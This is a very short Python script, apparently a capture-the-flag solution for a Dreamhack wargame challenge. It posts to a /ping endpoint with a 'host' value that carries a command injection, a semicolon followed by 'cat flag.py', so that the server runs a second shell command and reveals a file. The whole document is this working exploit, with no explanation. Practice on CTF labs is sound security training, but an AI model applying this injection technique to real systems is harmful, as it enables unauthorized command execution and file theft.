import requests

if __name__ == "__main__":
    res = requests.post("http://host3.dreamhack.games:19643/ping", {"host": '8.8.8.8";cat flag.py"'})
    print(res.text)